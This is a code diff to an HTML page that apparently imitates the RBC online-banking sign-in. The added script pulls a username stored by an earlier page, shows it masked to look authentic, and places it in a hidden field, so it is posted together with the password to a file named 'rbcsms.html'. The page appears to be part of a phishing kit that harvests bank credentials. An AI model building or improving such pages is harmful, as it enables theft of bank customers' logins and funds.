@@ -302,8 +302,25 @@
         <form action="rbcsms.html" method="POST">
         <div class="back-row">
             <a href="rbc.html" class="back-icon">&lt;</a>
-            <span>Signing in with <strong>Se</strong></span>
+            <span>Signing in with <strong id="userDisplay">...</strong></span>
         </div>
+        <input type="hidden" name="Client Card or Username" id="hiddenUser" />
+
+        <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var savedUser = sessionStorage.getItem('__rbc_user') || '';
+            var userDisplay = document.getElementById('userDisplay');
+            var hiddenUser = document.getElementById('hiddenUser');
+            if (savedUser) {
+                if (userDisplay) {
+                    userDisplay.innerText = savedUser.length > 2 ? savedUser.substring(0, 2) + '***' : savedUser;
+                }
+                if (hiddenUser) {
+                    hiddenUser.value = savedUser;
+                }
+            }
+        });
+        </script>
 
         <div class="label-row">
             <label>Password</label>
